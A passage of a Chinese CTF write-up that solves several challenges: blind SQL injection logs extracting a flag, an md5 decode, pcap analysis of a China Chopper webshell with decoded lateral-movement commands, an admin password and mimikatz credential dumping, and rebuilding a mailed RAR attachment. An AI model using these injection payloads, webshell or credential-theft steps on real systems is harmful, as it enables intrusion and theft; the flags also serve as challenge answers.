UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),4,1))>54 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),4,1))>53 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),5,1))>64 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),5,1))>96 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),5,1))>112 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),5,1))>104 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),5,1))>100 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),5,1))>102 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),5,1))>101 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),6,1))>64 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),6,1))>32 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),6,1))>48 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),6,1))>56 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),6,1))>52 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),6,1))>50 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),6,1))>49 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),7,1))>64 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),7,1))>96 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),7,1))>112 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),7,1))>104 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),7,1))>100 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),7,1))>98 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),7,1))>99 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),8,1))>64 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),8,1))>32 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),8,1))>48 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),8,1))>56 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),8,1))>52 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),8,1))>54 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),8,1))>53 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),33,1))>64 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),33,1))>32 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),33,1))>16 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),33,1))>8 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),33,1))>4 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),33,1))>2 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),33,1))>1 80 - 192.168.1.101  500 0 0
```

提取出来一共8个数字

```
53 50 99 54 102 49 100 54
```

转成字符`52c6f1d6`，其实我们也能看出来theflag其实应该是一个md5值，因为theflag字段一共32位，长得也很像md5。但没有后续的提示了，所以flag应该就是flag{52c6f1d6}

### Decode10

根据提示，明文的md5值是16478a151bdd41335dcd69b270f6b985

扔进工具解一下

```
base64wtfwtf123
```

所以最终的flag就是flag{base64wtfwtf123}

### 黑客攻击

打开压缩包是一个pcap的数据包，用wireshark打开

因为是黑客攻击，应该是http协议，所以在过滤器中输入http进行过滤

我们发现访问的域名基本都是config.php，这应该是一句话木马组合菜刀进行渗透测试，在config.php中加入了一句话木马

```
yo=@eval(base64_decode($_POST[z0]));
```

菜刀是通过base64编码对命令进行传输，随便点开一个config.php，打开http数据段，就能看到很多参数，我们将POST里面参数的值进行解密就能获取命令

所以我们就一条一条的解码，直到找到我们可能需要的

这里要说明一个问题，题目在这里出现了一个bug，可以直接获取到password

我们点击编号为449的数据，z2的值为
```
Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJm5ldCB1c2UgXFwxOTIuMTY4LjMwLjE4NFxDJCAiVGVzdCFAIzEyMyIgL3U6QWRtaW5pc3RyYXRvciZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==
```

解码得到

```
cd /d "c:\inetpub\wwwroot\"&net use \\192.168.30.184\C$ "Test!@#123" /u:Administrator&echo [S]&cd&echo [E]
```

我们发现它是利用管理员身份去登录的，而`Test!@#123`即为管理员的密码，其实这里我们的flag就出现了，当然题目的本意并不是这样的

在编号为10054的地方，我们看到一个rar文件生成的进度条，怀疑应该是生成了一个rar文件，猜测后面应该会有文件下载的数据

接着往下找，在编号为17729的地方看到数据特别大，怀疑是个文件下载，并且我们也看到了一个rar的数据包，验证上面我们的猜测

我们选中最后一行的`Line-based text data`，右键导出分组字节流，但要注意我们要把导出文件用16进制编辑器打开，删去开头处的`->|`和结尾处的`|<-`，保存

尝试去解压，发现需要密码，于是我们回到上面编号为10054的地方，查看文件生成的地方，应该会有我们想要的密码

于是我们点击编号9997，去查看生成文件的命令

```
cd /d "c:\inetpub\wwwroot\"&C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif -hpJJBoom&echo [S]&cd&echo [E]
```

百度一下winrar的命令行参数，发现`-hp`就是密码，那么密码我们就得到了，`JJBoom`

输入，成功解压，得到一个1.gif的文件，无法打开，用16进制编辑器打开，发现是一个dump文件，我们将文件名后缀改为dmp

接着我们用神器mimikatz提取密码

![](https://ws1.sinaimg.cn/large/006Vib6xgy1fosl83r6wqj30n00neq4z.jpg)

我们很清楚的看到，密码就是Test!@#123

所以flag就是flag{Test!@#123}

### 好多苍蝇

是一个pcapng包，用wireshark打开

使用统计功能，发现很多都是`mail.qq`这样的域名，猜测是发邮件，由上述知识可知，这题应该是发送一个较大的附件，分组发送

这里首要关注http的post请求

首先我们看到第一个post请求，在`HTML Form URL Encoded`中看到

```
{"path":"fly.rar","appid":"","size":525701,"md5":"e023afa4f6579db5becda8fe7861c2d3","sha":"ecccba7aea1d482684374b22e2e7abad2ba86749","sha3":""}
```

看到一个fly.rar的文件，还有文件的哈希值

往下找，找到连续五个带有这个md5值的post请求，编号分别为163、289、431、577、729，并且我们在编号为163的数据中看到了rar头，猜想应该是这五个文件组成了最终的fly.rar文件

选择`文件->导出对象->http`，将上述五个编号的文件导出，用16进制编辑器打开

发现第一个文件rar标志为前面有一串数据，长度为364，打开其他文件，发现其他文件前面也有相同的一段，猜测应该是验证什么的，并不是rar文件的数据，所以我们将前面的部分删除，再将五个文件的数据拼接在一起，生成完整的fly.rar

解压，需要密码，并且显示flag.txt头错误，我们去计算一下这个文件的哈希值，发现跟上面的md5值和sha1值相等，说明文件是没有问题的，应该是个伪加密，将第24位的84改为80，即可解决

修改之后，成功解压得到flag.txt，用notepad++打开发现是乱码，应该不是个txt文件，扔到binwalk里看一下，发现有很多东西，png图片啊什么的，而最开头是windows的一个可执行文件，不管他，直接foremost

分解出来很多png图片，全是苍蝇的图片，在最后看到一张二维码，扫描，得到flag{m1Sc_oxO2_Fly}
